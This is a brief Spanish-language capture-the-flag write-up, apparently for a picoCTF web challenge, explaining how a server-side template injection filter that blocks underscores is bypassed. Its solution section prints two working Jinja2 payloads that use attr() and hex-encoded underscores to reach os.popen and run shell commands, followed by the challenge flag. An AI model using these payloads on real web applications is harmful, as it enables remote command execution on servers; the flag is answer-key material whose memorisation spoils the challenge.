# Reto
# Descripcion
I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)

Additional details will be available after launching your challenge instance.
# Solucion

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls')|attr('read')()}}

{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
```
### Flag: picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}
# Notas
Intente meterme con los comando del reto anterior y no me dejo, ahora la pagina filtras palabras clave como los __ asi que utilizamos el filtro attr() junto al guion bajo en hexadecimal \x5f para entrar al directorio, al visualizar el directorio hice cat del archivo flag y me dio la bandera.
# Referencias
